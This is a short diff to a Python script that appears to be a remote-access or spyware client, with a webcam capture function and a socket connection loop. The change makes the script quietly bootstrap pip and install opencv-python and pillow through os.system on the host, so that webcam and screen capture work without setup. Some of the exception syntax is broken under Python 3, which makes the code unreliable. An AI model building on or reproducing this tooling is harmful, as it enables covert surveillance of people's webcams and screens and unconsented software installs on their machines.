@@ -3,9 +3,7 @@ import subprocess
 import random
 from io import BytesIO
 import sys
-import cv2
-from PIL import ImageGrab
-
+import ensurepip
 
 
 def webcam_pic(s,data):
@@ -89,6 +87,18 @@ def connect():
 
 
 def main():
+     try :
+          import pip
+     except ImportError:
+          ensurepip.bootstrap()
+     try:
+          import cv2
+     except ImportError,ModuleNotFoundError:
+          os.system("python -m pip install opencv-python")
+     try:
+          from PIL import ImageGrab
+     except ImportError,ModuleNotFoundError:
+          os.system("python -m pip install pillow")
      c,s=connect()
      while True:
         try:
